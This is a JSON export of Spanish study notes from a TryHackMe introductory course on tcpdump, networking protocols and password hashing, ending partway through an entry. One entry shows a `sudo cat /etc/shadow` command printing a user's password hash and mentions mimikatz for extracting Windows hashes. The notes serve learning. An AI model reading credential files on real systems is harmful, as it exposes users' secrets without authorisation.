    "content": "El mayor reto cuando estudiamos los protocolos es que no tenemos acceso a las \"conversaciones\" de estos. Todo queda detrás de interfaces de usuario. La mejor práctica es capturar el tráfico de la red y mirar de cerca los protocolos.\n\nEsta unidad introduce algunos comandos usados para Tcpdump. La herramienta Tcpdump y su librería `libpcap` están escritas en C y C++, lanzadas a finales de los 1980s y principio de los 1990s. La librería `libpcap` fue llevada a Windows MS como `winpcap`.\n\n----------------\n<h2>Objetivos de Aprendizaje</h2>\nEsta unidad intenta ofrecerte conocimientos necesarios básicos sobre `tcpdump`:\n\n- Capturar paquetes y guardarlos en un archivo.\n- Establecer filtros en los paquetes capturados.\n- Controlar cómo se muestran los paquetes capturados.\n\n-----------------\n<h2>Pre-requisitos</h2>\nSe recomienda estar familiarizado con el modelo TCP/IP, sus conceptos relacionados y sus numerosos protocolos.\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]\n\n"
  },
  {
    "title": "3. Filtering Expressions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/3-filtering-expressions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/3. Filtering Expressions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
    "content": "Aunque puedes ejecutar `tcpdump` sin ninguna expresión de filtrado, esto no será útil. Justo como en un encuentro social, no tratarás de escuchar a todo el mundo a la vez, sino que centrarás tu escucha en una persona o conversación.\n\n-------------------\n<h2>Filtrar por Host</h2>\nDigamos que sólo estamos interesados en un IP. Podemos limitar los paquetes capturados usando  `host <IP>` o `host <hostname>`.\n\nSi quieres limitar a los paquetes salientes de una dirección en concreto debes usar `src host <IP>` o `src host <hostname>`. De igual manera, puedes limitar a aquellos paquetes que llegan a una dirección concreta usando `dst host <IP>` o `dst host <hostname>.\n\n-------------\n<h2>Filtrar por Puerto</h2>\nSi quieres capturar todo el tráfico DNS, puedes filtrar la captura al puerto 53, por ejemplo. Para hacerlo usamos `port <puerto>`. Al igual que con el host, podemos aplicar filtrado de dirección (fuente o destino) con `src port <puerto>` y `dst port <puerto>`.\n\n----------------\n<h2>Filtrar por Protocolo</h2>\nEl tipo final de filtrado que cubriremos es filtrar por protocolo. Podemos filtrar a un tipo específico de protocolo como por ejemplo `ip`, `ip6`, `udp`, `tcp` o `icmp`. Si filtramos por `icmp` y vemos un `time exceeded` es probable que se deba a que alguien está usando el comando `traceroute`, mientras que si vemos un `echo` es probable que alguien esté usando el comando `ping`.\n\nPodemos usarlo simplemente escribiendo el protocolo.\n\n-------------\n<h2>Operadores Lógicos</h2>\nTres operadores lógicos que pueden ser de ayuda:\n\n- `and`: Captura paquetes donde las dos condiciones se cumplan. Por ejemplo, `tcpdump host 1.1.1.1 and tcp` capturará tráfico TCP con host `1.1.1.1`.\n- `or`: Captura paquetes donde una de las dos condiciones se cumpla. Por ejemplo, `tcpdump udp or icmp` capturará tráfico UDP o ICMP.\n- `not`: Captura paquetes cuando la condición no es cierta. Por ejemplo, `tcpdump not tcp` capturará todos los paquetes menos los TCP.\n\n---------------\n<h2>Resumen y Ejemplos</h2>\nUna tabla con las cosas que hemos aprendido:\n\n| Comando                                      | Explicación                                            |\n| -------------------------------------------- | ------------------------------------------------------ |\n| `tcpdump host IP` or `tcpdump host HOSTNAME` | Filtra paquetes por dirección IP o nombre de host.     |\n| `tcpdump src host IP` or                     | Filtra paquetes provenientes de una cierta dirección.  |\n| `tcpdump dst host IP`                        | Filtra paquetes destinados a una dirección.            |\n| `tcpdump port PORT_NUMBER`                   | Filtra paquetes por número de puerto.                  |\n| `tcpdump src port PORT_NUMBER`               | Filtra paquetes provenientes de un puerto determinado. |\n| `tcpdump dst port PORT_NUMBER`               | Filtra paquetes destinados a un cierto puerto.         |\n| `tcpdump PROTOCOL`                           | Filtra paquetes por protocolo.                         |\nAlgunos ejemplos:\n\n- `tcpdump -i any tcp port 22`: Escucha en todas las interfaces y captura paquetes `tcp` desde o a el puerto 22 (SSH).\n- `tcpdump -i wlo1 udp port 123`: Escucha en la interfaz `wlo1` y captura paquetes `udp` provenientes o dirigidos al puerto 123 (Network Time Protocol, NTP).\n- `tcpdump -i eth0 host example.com and tcp port 443 -w hhts.pcap`: Escuchará en `eth0` hasta que sea interrumpido los paquetes relacionados con `example.com` y aquellos que tengan como salida o destino el puerto 443 y los meterá en un archivo llamado `https.pcap`."
  },
  {
    "title": "6. NAT",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/6-nat/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/6. NAT.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "Como ya hemos hablado, IPv4 puede soportar hasta 4 billones de dispositivos a la vez como máximo. Con el incremento en dispositivos por usuario este número se ha quedado pequeño. Una solución a esto es NAT.\n\nLa idea detrás de NAT es que una IP pública pueda dar acceso a Internet a varias IPs privadas, de tal manera que una empresa con 20 ordenadores puede conectarlos todos a Internet mediante una sola IP pública.\n\nLos routers adaptados a NAT, deben tener una manera de rastrear paquetes en conexiones, por eso tienen una tabla que traduce entre direcciones internas y externas. Generalmente la red interna usa direcciones IP privadas mientras que la externa, públicas.\n\nAbajo un ejemplo. El portátil `192.168.0.129` al establecer una conexión con el servidor, estará desde su punto de vista haciéndolo desde esta misma IP y el puerto `15401`. Sin embargo, para el servidor, esta conexión estará siendo realizada desde `212.3.4.5` y puerto `19273`.\n\n![[079.jpg]]\n"
  },
  {
    "title": "0. Networking Essentials",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/0-networking-essentials/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/0. Networking Essentials.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/1. Introduction]]\n[[2. DHCP - Give Me My Network Settings]]\n[[3. ARP - Bridging Layer 3 Addressing to Layer 2 Addressing]]\n[[4. ICMP - Troubleshooting Networks]]\n[[5. Routing]]\n[[6. NAT]]"
  },
  {
    "title": "3. ARP - Bridging Layer 3 Addressing to Layer 2 Addressing",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/3-arp-bridging-layer-3-addressing-to-layer-2-addressing/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/3. ARP - Bridging Layer 3 Addressing to Layer 2 Addressing.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "Hemos hablado de que cuando dos hosts se comunican por una red, un paquete IP es encapsulado cuando pasa por la capa 2. Acuérdate que las dos capas de link más comunes son el Ethernet (IEEE 802.3) y la WiFi (IEEE 802.11). Aunque se conozca la IP de destino, necesita comprobar su MAC para que el paquete correcto sea creado.\n\nDe cualquier forma, los dispositivos en la misma red de Ethernet, no necesitan saber la MAC del otro todo el rato, sólo mientras se comunican.\n\nDebajo podemos ver un paquete IP en un marco de Ethernet que contiene:\n\n- Dirección MAC de destino.\n- Dirección MAC de origen.\n- Tipo (IPv4 en este caso).\n\n![[074.png]]\n\nEl ARP hace posible encontrar la dirección MAC de otro dispositivo en Ethernet. En el ejemplo de abajo, un host con IP `192.168.66.89` quiere comunicarse con otro sistema con la IP `192.168.66.1`. Manda una petición ARP pidiendo al host `192.168.66.1` que responda y este lo hace con su dirección MAC.\n\n```bash\nuser@TryHackMe$ tshark -r arp.pcapng -Nn     \n1 0.000000000 cc:5e:f8:02:21:a7 → ff:ff:ff:ff:ff:ff ARP 42 Who has 192.168.66.1? Tell 192.168.66.89     \n2 0.003566632 44:df:65:d8:fe:6c → cc:5e:f8:02:21:a7 ARP 42 192.168.66.1 is at 44:df:65:d8:fe:6c\n```\n\nSi usamos `tcpdump` en vez de `tshark`, los paquetes se mostrarán con un formato diferente, con request y reply:\n\n```bash\nuser@TryHackMe$ tcpdump -r arp.pcapng -n -v \n17:23:44.506615 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.66.1 tell 192.168.66.89, length 28 \n17:23:44.510182 ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.66.1 is-at 44:df:65:d8:fe:6c, length 28\n```\n\nUna petición ARP no se encapsula en un UDP o paquete IP, sino que es encapsulada directamente en un marco Ethernet como muestra la foto:\n\n![[075.png]]\n\nARP se considera capa 2 porque trabaja con direcciones MAC. Otros discutirían que es parte de la capa 3 porque soporta operaciones IP. Lo que es esencial saber es que ARP permite la traducción del direccionamiento de la capa 3 al direccionamiento de la capa 2.\n"
  },
  {
    "title": "5. Routing",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/5-routing/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/5. Routing.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "¿Cómo puede Internet averiguar cómo llevar los paquetes de la red X a la red Y o a la red Z? Necesitamos algún algoritmo.\n\nInternet se compone de millones de routers y billones de dispositivos. La red de la imagen de abajo es una pequeña subred de Internet. Necesitamos un algoritmo de routeado para averiguar qué camino tomar.\n\n![[078.jpg]]\n\nLos algoritmos no entran en el temario, pero de cualquier forma, describiremos brevemente unos cuantos protocolos para familiarizarnos:\n\n- OSPF (Open Shortest Path First): Es un protocolo que les permite a los routers compartir información sobre su topología y así calcular la ruta abierta más corta.\n- EIGRP (Enhanced Interior Gateway Routing Protocol): Es un protocolo propiedad de Cisco que permite que los routers compartan información sobre a qué redes pueden acceder y cuánto cuesta (en términos de ancho de banda, por ejemplo) de tal forma que se puede calcular la ruta más eficiente.\n- BGP (Border Gateway Protocol): Es el protocolo primario usado en Internet. Permite a diferentes redes intercambiar información y establecer caminos eficientes.\n- RIP (Routing Information Protocol): Es un protocolo simple usado normalmente en redes pequeñas. Comparten información sobre las redes a las que pueden acceder y los saltos necesarios para llegar allí."
  },
  {
    "title": "4. ICMP - Troubleshooting Networks",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/4-icmp-troubleshooting-networks/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/4. ICMP - Troubleshooting Networks.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "El ICMP es usado principalmente para la diagnosis de la red y reporte de errores. Dos comandos populares recaen en ICMP, y son instrumentales en la resolución de problemas de red y seguridad de esta. Los comandos son:\n\n- `ping`: Este comando usa ICMP para comprobar la conectividad de un sistema objetivo y mide el RTT (Round-Trip Time).\n- `traceroute`: Este comando es llamado así en sistemas UNIX y `tracert` en sistemas MS Windows. Usa ICMP para descubrir la ruta entre tú y tu destino.\n\n-----------------\n<h2>Ping</h2>\nA lo mejor nunca has jugado al ping-pong, pero gracias a `ping` ahora puedes hacerlo con un ordenador. El comando `ping` manda una petición echo mediante ICMP (tipo 8).\n\n![[076.png]]\n\nEl ordenador que lo recibe devuelve un \"pong\", una petición echo mediante ICMP (tipo 0).\n\n![[077.png]]\n\nMuchas cosas pueden interrumpir el ping. Además del hecho de que pueda estar offline o apagado, un firewall puede estar bloqueando el tráfico necesario para que `ping` funcione.\n\n--------------\n<h2>Traceroute</h2>\n¿Cómo podemos hacer que cada router entre nuestro sistema y el objetivo se identifique?\n\nEl protocolo de Internet tiene un campo llamado TTL (Time To Live). que indica el máximo número de routers por el que un paquete puede viajar antes de ser descartado. El router decrementa el TTL en uno antes de mandarlo. Cuando el paquete llega a TTL 0, el router lo descarta y manda un ICMP Time Exceeded (tipo 11). En este contexto, el tiempo se mide en routers, no en segundos.\n\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "¿Alguna vez te has preguntado cómo tu ordenador configura de manera dinámica los ajustes de red? ¿Has querido saber por cuántos dispositivos y países han pasado tus paquetes antes de llegar a su destino? ¿Tienes curiosidad por saber cómo todos tus dispositivos pueden  acceder a Internet aunque tu ISP sólo te da una dirección IP?\n\nEsta lección es la segunda de una serie de cuatro sobre el networking:\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]\n\n-----------------\n<h2>Pre-requisitos</h2>\n- [[2. OSI Model]]\n- [[3. TCP-IP Model]]\n- [[5. UDP and TCP]]\n- [[0. Networking Concepts]]\n\n----------------\n<h2>Objetivos de aprendizaje</h2>\nEn esta lección aprenderemos:\n\n- DHCP (Dynamic Host Configuration Protocol).\n- ARP (Address Resolution Protocol).\n- NAT (Network Address Translation).\n- ICMP (Internet Control Message Protocol)."
  },
  {
    "title": "2. DHCP - Give Me My Network Settings",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/2-networking-essentials/2-dhcp-give-me-my-network-settings/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/2. Networking Essentials/2. DHCP - Give Me My Network Settings.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 2. Networking Essentials",
    "content": "Cuando vas, por ejemplo, a una cafetería. Abres tu ordenador y éste, automáticamente recibe una dirección IP y de esta manera puedes conectarte a Internet sin tener que haber hecho nada.\n\nCuando queremos acceder a una red, al menos necesitamos configurar:\n\n- Dirección IP con su correspondiente máscara de subred.\n- Router o gateway.\n- Servidor DNS.\n\nConfigurar estas manualmente es una buena opción, sobre todo para servidores. Estos no necesitan moverse, además, la gente que quiere conectarse a ellos espera hacerlo en una IP fija.\n\nDe todas formas, tener una forma automatizada de hacer esto es muy buena opción para dispositivo móviles, pues evita trabajo y conflictos de coincidencia, que dejarían a uno de los dispositivos sin poder acceder a la red.\n\nLa solución para esto es DHCP, un protocolo que se basa en UDP. El servidor escucha UDP en el puerto 67 y el cliente manda desde UDP puerto 68.\n\nDHCP sigue cuatro pasos: Descubrir, ofrecer, pedir y reconocer.\n\n![[72.jpg]]\n\n1. Discover: El cliente bropadcastea un mensaje DHCPDICOVER buscando el servidor local DHCP si existe.\n2. Offer: EL servidor le responde con un mensaje DHCPOFFER con la dirección IP disponible.\n3. Request: El cliente responde con DHCPREQUEST para indicar que acepta la dirección IP asignada.\n4. Acknowledge: El servidor responde con un mensaje DHCPACK para confirmar que la dirección IP se le ha sido asignada al cliente.\n\n![[073.jpg]]\n\nEl cliente empieza la conexión sin dirección IP, sólo MAC. En el primer y tercer paso no tiene IP todavía. El cliente se comunica desde la \"IP\" `0.0.0.0` y manda la comunicación junto con la MAC a la broadcast: `255.255.255.255`. \n\nAl final del proceso DHCP, el dispositivo ha recibido:\n\n- La IP para acceder a recursos en la red.\n- La gateway para routear los paquetes fuera de la red.\n- Un servidor DNS para resolver nombres de dominios."
  },
  {
    "title": "4. Using Hashing for Secure Password Storage",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/4-using-hashing-for-secure-password-storage/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/4. Using Hashing for Secure Password Storage.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "<h2>Usar Hashing para Guardar Contraseñas</h2>\nAquí es donde entra el hashing. ¿Qué pasa si en vez de guardar las contraseñas guardásemos el valor hash con una función segura? Esto implica que nunca tienes que guardar la contraseña de un usuario y que si se filtra, el atacante lo tendrá muy complicado para saber cuál es.\n\nSólo hay un problema con esto. ¿Qué pasa si dos usuarios tienen la misma contraseña? Eso quiere decir que si un atacante rompe uno de los hashes, automáticamente gana acceso a más de una cuenta. También quiere decir que alguien puede crear una Rainbow Table para romper los hashes.\n\nUna tabla arcoiris es una tabla de consulta de conversión de hash a texto plano. Páginas como [CrackStation](https://crackstation.net/) y [Hashes.com](https://hashes.com/en/decrypt/hash) usan masivas tablas arcoiris para ofrecer una manera rápida de crackear contraseñas en hashes sin salts.\n\n------------------\n<h2>Protección contra Tablas Arcoiris</h2>\nPara protegernos contra estas tablas, añadimos sal a las contraseñas. Esto es un número generado aleatoriamente y único para cada usuario guardado en la base de datos.\n\nCada uno de estos valores es añadido al inicio o al final de cada una de las contraseñas.Funciones hasheadoras como Bcrypt y Scrypt manejan esto automáticamente. Las salts no necesitan ser privadas.\n\n------------\n<h2>Ejemplo de Guardado Seguro de Contraseñas</h2>\nConsidera comprobar si existe algún estándar sobre almacenaje de contraseñas en tu región antes de hacerlo. Considera esto un ejemplo de buenas prácticas de seguridad al almacenar contraseñas:\n\n1. Seleccionamos una función hasheadora segura, como Argon2, Scrypt, Bcrypt, o PBKDF2.\n2. Añadimos una única salt a la contraseña, como `Y4UV*^(=go_!`.\n3. Calculamos el hash de la contraseña combinada con la salt. En este ejemplo usaremos `AL4RMc10kY4UV*⁽=go_!`.\n4. Guardamos el valor hash y la salt única usada (`Y4UV*^(=go_!`)\n\n-----------\n<h2>Usar Encriptación para guardar Contraseñas</h2>\nConsiderando el problema para guardar contraseñas, ¿por qué no encriptamos las contraseñas y ya? El problema con esto es que necesitaríamos guardar con ellas la clave de desencriptación, y si alguien consiguiese acceso sería todavía más fácil conseguirlas."
  },
  {
    "title": "8. Conclusion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/8-conclusion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/8. Conclusion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "En esta unidad hemos visto las funciones hasheadoras y sus usos para diferentes propósitos. Antes de continuar, deberíamos distinguir entre hashear, encodear y encriptar.\n\n**Hashing**, como ya hemos visto, es un proceso mediante el cual se coge un input y se extrae un output, que es siempre el mismo y de un único sentido (no se puede \"des-hashear\").\n\n**Encoding**, convierte la información de una forma a otra para hacerla compatible con un sistema específico (ASCII, UTF-8, UTF-16, etc.). Es reversible y cualquiera puede obtener la información, por lo que no se debe confundir con la encriptación.\n\n**Encryption**, protege la información usando un cifrado criptográfico y claves. Es reversible pero sólo si se tiene la clave (técnicamente).\n"
  },
  {
    "title": "3. Insecure Password Storage for Authentication",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/3-insecure-password-storage-for-authentication/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/3. Insecure Password Storage for Authentication.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "El hashing tiene múltiples usos en ciberseguridad. En esta lección aprenderemos dos: almacenamiento de contraseñas e integridad de datos. Es importante recalcar que esto no aplica a los gestores de contraseñas, los cuales necesitan rescatarlas en texto plano. Por otro lado, los mecanismos de autentificación sólo necesitan confirmar que el usuario conoce la contraseña.\n\n------------\n<h2>Historias de Almacenamiento Inseguro de Contraseñas para la Autentificación</h2>\nLa mayoría de aplicaciones web necesitan verificar la contraseña de un usuario en algún punto. Guardar estas contraseñas en texto plano es una práctica muy insegura. El hecho de que mucha gente use la misma contraseña para todo hace que si una de sus múltiples cuentas se ve expuesta, todas lo sean.\n\nVeremos tres prácticas inseguras en lo que respecta a las contraseñas:\n\n- Guardar contraseñas en texto plano.\n- Guardar contraseñas usando un sistema de encriptación deprecado.\n- Guardar contraseñas usando un algoritmo de hashing inseguro.\n\n<h3>Guardar contraseñas en texto plano</h3>\nSeguramente estés familiarizado con la lista `rockyou.txt` de contraseñas en Kali Linux. Esta lista proviene de la empresa RockYou, la cual guardaba sus contraseñas en texto plano y que se vio comprometida. El archivo contiene alrededor de 14 millones de contraseñas. Puedes encontrar dicho archivo en `/usr/share/wordlists/`.\n\n<h3>Usar algoritmos de encriptación inseguros</h3>\nEl data breach de Adobe fue algo diferente. En vez de usar una función hasheadora segura, la compañía usaba una deprecada para almacenar las contraseñas. Además, las pistas de las contraseñas se guardaban en texto plano, llegando a contener la propia contraseña.\n\n<h3>Usar una función de hasheo insegura</h2>\nLinkedIn también sufrió un data breach en 2012. Esta empresa usaba un algoritmo inseguro, SHA-1, para guardar las contraseñas. Además no se usaba password salting (añadir **salt**, un valor aleatorio antes de hashear)."
  },
  {
    "title": "2. Hash Functions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/2-hash-functions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/2. Hash Functions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "<h2>¿Qué es una función haseadora?</h2>\nLas funciones hasheadoras son diferentes de la encriptación. No hay clave y se supone que son imposibles (o computacionalmente imprácticas) de descodificar.\n\nUna de estas toma un input de cualquier tamaño y crea un resumen de la información. El resultado tiene una longitud fija. Es difícil predecir el resultado dado el input y viceversa. Los buenos algoritmos de hashing son rápidos de computar e increíblemente lentos de deshacer. Cualquier ligero cambio aunque sólo sea un bit causará un gran cambio en el resultado.\n\nAlgunos \n\n-----------------\n<h2>¿Por qué es importante hashear?</h2>\nEl hashing es esencial para proteger la integridad de los datos y asegurar la confidencialidad de las contraseñas.\n\nCuando te logueas en un sitio web, se usa hashing para comprobar tu contraseña. Por buenas razones de seguridad, el servidor no almacena tu contraseña sino el hash. Para darte acceso, se compararán los hashes de tu contraseña y el guardado por el servidor.\n\n-----------------\n<h2>¿Qué es una colisión de hashes?</h2>\nUna colisión de hashes es cuando dos inputs diferentes dan el mismo resultado. Las funciones hasheadoras están diseñadas para evitar esto. Además previenen a usuarios de hacerlo adrede. Sin embargo, como el número de inputs es prácticamente ilimitado y los resultados son limitados, esto lleva al efecto pigeonhole (encasillamiento).\n\nPor poner un ejemplo numérico: Si una función hash produce un valor hash de 4 bits. Sólo tenemos 16 valores hash. El número total de valores hash posibles es `2^numero_de_bits = 2⁴ = 16`. La probabilidad de colisión es bastante alta.\n\nEl efecto pigeonhole declara que el número de ítems (pigeons) es mayor que el numero de casillas (pigeonholes), es lo mismo que pasa si juntas a 400 personas y preguntas por su cumpleaños, al menos dos cumplirán el mismo día, es inevitable.\n\nMD5 y SHA1 han sido atacados y ahora son considerados inseguros dado a la habilidad de generar colisiones de hashes. Sin embargo, ningún ataque las ha generado en ambos a la vez. Si comparamos MD5 y SHA1 veremos que son diferentes. Aprende más sobre estos ataques en [MD5 ataque de colisión](https://www.mscs.dal.ca/~selinger/md5collision/) y [SHA1 ataque de colisión](https://shattered.io/)."
  },
  {
    "title": "5. Recognising Password Hashes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/5-recognising-password-hashes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/5. Recognising Password Hashes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "Hemos cubierto cómo guardar contraseñas de forma segura para sistemas de autentificación desde el lado defensivo. Veámoslo desde el lado ofensivo ahora. Dados un hash, ¿cómo reconocemos el tipo, lo rompemos y obtenemos la contraseña?\n\nExisten herramientas automatizadas de reconocimiento de hash como [hashID](https://pypi.org/project/hashID/) pero no son del todo fiables.\n\n-----------\n<h2>Contraseñas de Linux</h2>\nEn Linux, los hashes de las contraseñas se guardan en `/etc/shadow`, que es normalmente sólo leíble por root. Solía guardarse en `/etc/passwd`, que era leíble por todos.\n\nCada línea en `/etc/shadow` contiene 9 campos separados por `:`. Los primeros dos campos son el nombre y la contraseña encriptada.\n\nEl campo de la contraseña encriptada contiene la contraseña con 4 componentes: prefijo (id de algoritmo), opciones (parámetros), salt y hash. El prefijo hace que sea fácil identificar el tipo de algoritmo.\n\nAquí una tabla de prefijos listado en orden descendente de fortaleza:\n\n| Prefijo                        | Algoritmo                                                                                                                                            |\n| ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `$y$`                          | yescrypt es un esquema de hashing escalable por defecto recomendado en sistemas nuevos.                                                              |\n| `$gy$`                         | gost-yescrypt usa la función hasheadora GOST R 34.11-2012 y el método yescrypt.                                                                      |\n| `$7$`                          | scrypt es una función basada en contraseñas                                                                                                          |\n| `$2b$`, `$2y$`, `$2a$`, `$2x$` | bcrypt es un hash basado en el bloque de cifrado Blowfishdesarrollado por OpenBSD.                                                                   |\n| `$6$`                          | sha512crypt es un hash basado en SHA-2 con output de 512-bits originalmente desarrollado for GNU libc y comunmente usado en sistemas Linux antiguos. |\n| `$md5`                         | SunMD5 es un hash basado en el algoritmo MD5 originalmente desarrollado por Solaris                                                                  |\n| `$1$`                          | md5crypt es un hash basado en el algoritmo MD5 originalmente desarrollado por FreeBSD                                                                |\n\n-------------\n<h2>Contraseñas de Linux Moderno</h2>\nConsidera la siguiente línea de un sistema Linux moderno del archivo `shadow`:\n\n```bash\nroot@TryHackMe# sudo cat /etc/shadow | grep strategos strategos:$y$j9T$76UzfgEM5PnymhQ7TlJey1$/OOSg64dhfF.TigVPdzqiFang6uZA4QA1pzzegKdVm4:19965:0:99999:7:::\n```\n\nEn el ejemplo vemos cuatro partes separadas por `$`:\n\n- `y` indica el algoritmo de hasheado utilizado, **yescrypt**.\n- `j9T` es un parámetro pasado al algoritmo.\n- `76UzfgEM5PnymhQ7TlJey1` es la salt usada.\n- `/OOSg64dhfF.TigVPdzqiFang6uZA4QA1pzzegKdVm4` es el valor hash.\n\n------------\n<h2>Contraseñas de MS Windows</h2>\nLas contraseñas de Windows MS se hashean usando NTLM, una variante de MD4. Son visualmente idénticas a los hashes MD4 y MD5.\n\nEn MS Windows, los hashes de contraseñas se guardan en SAM (Security Accounts Manager). MS Windows intenta prevenir a los usuarios normales de verlas pero existen herramientas como `mimikatz` para bypassear la seguridad de Windows. Los hashes que encontramos allí se dividen entre hashes NT y hashes LM.\n\nUn buen lugar para encontrar más formatos de hashing y prefijos de contraseñas es la página [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes). Para otros tipos, normalmente tendrás que comprobar la longitud o codificación o incluso realizar una investigación en la aplicación que los generó."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "Considera este escenario. Te acabas de descargar un archivo de 6 GB y quieres saber si la copia que has descargado es idéntica al archivo original, bit a bit. O si una persona te diese un pincho con 6 GB, ¿cómo sabrías si es exactamente igual?\n\nLa respuesta descansa en la comparación de los valores hash. Si dos hashes son iguales, podemos estar seguros de que los archivos son idénticos.\n\nUn valor hash es una string de caracteres de valor fijo computada por una función hasheadora. Esta toma un input de cualquier tamaño y devuelve una string de caracteres de tamaño fijo único.\n\n----------\n<h2>Pre-requisitos</h2>\nEsta unidad es la tercera de una lista de tres:\n\n- [[0. Cryptography Basics]]\n- [[0. Public Key Cryptography Basics]]\n- [[0. Hashing Basics]]\n\n----------------\n<h2>Objetivos de Aprendizaje</h2>\nAl completar esta unidad habrás aprendido:\n\n- Funciones hasheadoras y colisiones.\n- El rol del hashing en la autentificación de sistemas.\n- Reconocer valores hash guardados.\n- Romper hashes.\n- El uso de los hashes para la protección de la integridad."
  },
  {
    "title": "0. Hashing Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/0-hashing-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/0. Hashing Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/1. Introduction]]\n[[2. Hash Functions]]\n[[3. Insecure Password Storage for Authentication]]\n[[4. Using Hashing for Secure Password Storage]]\n[[5. Recognising Password Hashes]]\n[[6. Password Cracking]]\n[[7. Hashing for Integrity Checking]]\n[[THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/8. Conclusion]]\n"
  },
  {
    "title": "7. Hashing for Integrity Checking",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/7-hashing-for-integrity-checking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/7. Hashing for Integrity Checking.md",
